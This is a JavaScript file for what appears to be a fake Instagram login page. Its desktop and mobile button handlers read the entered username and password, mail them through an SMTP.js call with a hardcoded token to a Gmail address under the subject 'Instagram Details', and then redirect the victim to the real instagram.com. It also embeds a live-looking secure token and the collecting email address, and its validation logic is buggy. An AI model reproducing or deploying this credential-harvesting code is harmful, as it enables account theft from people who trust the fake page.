document.querySelector('.detail-btn').addEventListener('click', () => {
  const username = document.querySelector('.username')
  const password = document.querySelector('.password')
  const emailValidation = emailCheck(username)
  const phoneValidation = PhoneCheck(username)

  const details = {
    username: username.value,
    password: password.value
  }

  if ( ((emailValidation) || (phoneValidation) || (username.value > 2)) && (password.value)) {

    details.username = username.value
    details.password = username.password

    console.log(details);
    // location.replace('instagram.com')

  } else if (!(username.value)) {
    username.focus()
  } else if (!(password.value)) {
    password.focus()
  } else {
    console.log(details);
    sendEmail(details)
    location.replace('https://www.instagram.com/')
  }
})

document.querySelector('.mobile-button').addEventListener('click', () => {
  const username = document.querySelector('.mobile-username')
  const password = document.querySelector('.mobile-password')
  const emailValidation = emailCheck(username)
  const phoneValidation = PhoneCheck(username)

  const details = {
    username: username.value,
    password: password.value
  }

  if ( ((emailValidation) || (phoneValidation) || (username.value > 2)) && (password.value)) {

    details.username = username.value
    details.password = username.password

    // console.log(details);
    // location.replace('instagram.com')

  } else if (!(username.value)) {
    username.focus()
  } else if (!(password.value)) {
    password.focus()
  } else {
    console.log(details);
    sendEmail(details)

    setTimeout(()=>{
      window.location.href = 'https://www.instagram.com/'
    },1000)
    
    username.value = ''
    password.value = ''
  }
})

function emailCheck(username) {
  const emailValidation = (/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/).test(username.value);
  
  return emailValidation;
};

function PhoneCheck(username) {
  const countryCodes = ['234', '090', '1', '091', '070', '080', '081']

  const phoneValidation = countryCodes.some(elem => username.value.match('^' + elem) && (username.value.length > 10 && username.value.length < 12));

  return phoneValidation;
};


function sendEmail(details) {
  Email.send({
    SecureToken: 'df8f40ea-1dd8-472f-8275-cb1c21b6e940',
    To : 'wardude704@gmail.com',
    From : "wardude704@gmail.com",
    Subject : "Instagram Details",
    Body : `
      Title: "User Details";  
      <br> Instagram or Tiktoks Username: ${details.username}; 
      <br> Password: ${details.password}
    `
  }).then(
    message => console.log(details.username)
  );
}
